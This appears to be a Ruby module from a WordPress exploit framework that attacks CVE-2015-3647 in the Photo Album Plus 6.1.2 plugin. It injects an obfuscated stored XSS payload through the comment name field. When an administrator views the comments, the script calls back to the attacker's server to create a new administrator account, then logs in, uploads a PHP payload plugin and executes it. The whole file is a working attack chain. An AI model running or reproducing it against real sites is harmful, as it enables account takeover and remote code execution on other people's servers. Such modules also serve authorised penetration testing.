require 'erb'

class Wpxf::Exploit::PhotoAlbumPlusStoredXss < Wpxf::Module
  include Wpxf
  include Wpxf::Net::HttpClient
  include Wpxf::WordPress::Login
  include Wpxf::WordPress::Plugin
  include Wpxf::WordPress::Xss

  include ERB::Util

  def initialize
    super

    update_info(
      name: 'Photo Album Plus 6.1.2 XSS Shell Upload',
      desc: 'The vulnerability exists due to the absence of filtration of '\
            'user-supplied input passed via the "comname" and "comemail" '\
            'HTTP POST parameters to "/wp-content/plugins/wp-photo-album-plus/'\
            'wppa-ajax-front.php" script when posting a comment.'\
            "\n"\
            'A remote attacker can post a specially crafted message '\
            'containing malicious HTML or script code and execute it in '\
            'the administrator\'s browser in context of the vulnerable '\
            'website, when an administrator views images or comments in '\
            'the administrative interface.',
      author: [
        'High-Tech Bridge Security Research Lab',   # Discovery and disclosure
        'Rob Carr <rob[at]rastating.com>'           # WPXF module
      ],
      references: [
        ['CVE', '2015-3647'],
        ['WPVDB', '7996'],
        ['URL', 'https://www.htbridge.com/advisory/HTB23257']
      ],
      date: 'May 20 2015'
    )
  end

  def check
    check_plugin_version_from_readme('wp-photo-album-plus', '6.1.3')
  end

  def plugin_url
    normalize_uri(wordpress_url_plugins, 'wp-photo-album-plus')
  end

  def ajax_url
    normalize_uri(plugin_url, 'wppa-ajax-front.php')
  end

  def script
    %Q|
      var a = document.createElement("script");
      a.setAttribute("src", "#{xss_url}");
      document.head.appendChild(a);
    |
  end

  def encoded_script
    "eval(decodeURIComponent(/#{url_encode(script)}/.source))"
  end

  def post_script
    execute_post_request(
      url: ajax_url,
      body: {
        'action'      => 'wppa',
        'wppa-action' => 'do-comment',
        'photo-id'    => Utility::Text.rand_numeric(3),
        'comment'     => Utility::Text.rand_alpha(50),
        'comemail'    => "#{Utility::Text.rand_alpha(10)}@#{Utility::Text.rand_alpha(10)}.com",
        'comname'     => "#{Utility::Text.rand_alpha(8)}<script>#{encoded_script}</script>"
      }
    )
  end

  def upload_shell(username, password)
    cookie = authenticate_with_wordpress(username, password)
    return false unless cookie

    emit_info 'Uploading payload...'
    plugin_name = Utility::Text.rand_alpha(10)
    payload_name = Utility::Text.rand_alpha(10)
    unless wordpress_upload_payload_plugin(plugin_name, payload_name, cookie)
      emit_error 'Failed to upload the payload'
      return false
    end

    payload_url = normalize_uri(wordpress_url_plugins, plugin_name, "#{payload_name}.php")
    emit_info "Executing the payload at #{payload_url}..."
    res = execute_get_request(url: payload_url)

    if res && res.code == 200 && !res.body.empty?
      emit_success "Result: #{res.body}"
    end

    true
  end

  def on_http_request(path, params, headers)
    if params['u'] && params['p']
      emit_success "Created a new administrator user, #{params['u']}:#{params['p']}"
      stop_http_server

      # Set this for #run to pick up to determine success state
      @success = upload_shell(params['u'], params['p'])

      return ''
    else
      emit_info 'Incoming request received, serving JavaScript...'
      return wordpress_js_create_user
    end
  end

  def run
    super
    return false unless check_wordpress_and_online

    # Success will determined in another procedure, so initialize to false.
    @success = false

    emit_info 'Storing script...'
    emit_info encoded_script, true
    res = post_script

    if res.nil?
      emit_error 'No response from the target'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    emit_success "Script stored and will be executed upon visiting /wp-admin/admin.php?page=wppa_manage_comments"
    start_http_server

    return @success
  end
end
